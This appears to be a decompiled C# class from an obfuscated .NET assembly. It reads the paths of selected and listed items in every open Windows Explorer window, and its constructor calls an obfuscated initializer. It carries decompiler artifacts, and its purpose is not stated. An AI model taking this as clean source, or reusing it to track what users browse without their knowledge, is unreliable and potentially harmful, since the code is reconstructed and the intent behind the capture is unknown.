using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using SHDocVw;
using Shell32;
using CoreBaseUsb.Utilities;

namespace CoreBaseUsb.RAW
{
    public class MyShell
    {
        public static void GetWindowItems()
        {
            ArrayList arrayList = new ArrayList();
            foreach (object obj in new ShellWindowsClass())
            {
                InternetExplorer internetExplorer = (InternetExplorer)obj;
                string text = Path.GetFileNameWithoutExtension(internetExplorer.FullName).ToLower();
                if (text.ToLowerInvariant() == "explorer")
                {
                    FolderItems folderItems = ((IShellFolderViewDual2)internetExplorer.Document).SelectedItems();
                    foreach (object obj2 in folderItems)
                    {
                        FolderItem folderItem = (FolderItem)obj2;
                        arrayList.Add(folderItem.Path);
                    }
                }
            }
        }

        // Token: 0x0600001E RID: 30 RVA: 0x00003BC4 File Offset: 0x00001DC4
        public static List<string> FilesAndFolders()
        {
            List<string> list = new List<string>();
            new ShellClass();
            foreach (object obj in ((IShellWindows)new ShellWindowsClass()))
            {
                InternetExplorer internetExplorer = (InternetExplorer)obj;
                string text = Path.GetFileNameWithoutExtension(internetExplorer.FullName).ToLower();
                if (text.ToLowerInvariant() == "explorer")
                {
                    Folder folder = ((IShellFolderViewDual2)internetExplorer.Document).Folder;
                    FolderItems folderItems = folder.Items();
                    foreach (object obj2 in folderItems)
                    {
                        FolderItem folderItem = (FolderItem)obj2;
                        list.Add(folderItem.Path);
                    }
                }
            }
            return list;
        }

        // Token: 0x0600001F RID: 31 RVA: 0x000022AB File Offset: 0x000004AB
        public MyShell()
        {
            Class3.vd4OXo2zYFEgU();
            //base..ctor();
        }
    }
}
